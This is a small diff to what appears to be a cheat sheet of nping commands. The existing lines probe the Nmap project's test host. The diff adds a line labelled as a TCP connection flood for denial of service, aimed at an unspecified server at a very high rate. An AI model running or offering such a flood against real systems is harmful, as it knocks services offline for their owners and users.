@@ -16,3 +16,8 @@ $ nping -c 1 --udp -p 123 scanme.nmap.org
 See if the echo server on scanme will respond..
 
 $ nping --echo-client "public" scanme.nmap.org
+
+# TCP Connection flood - DOS using nping
+nping --tcp-connect -rate=90000 -c 900000 -q <server url / ip address>
+
+
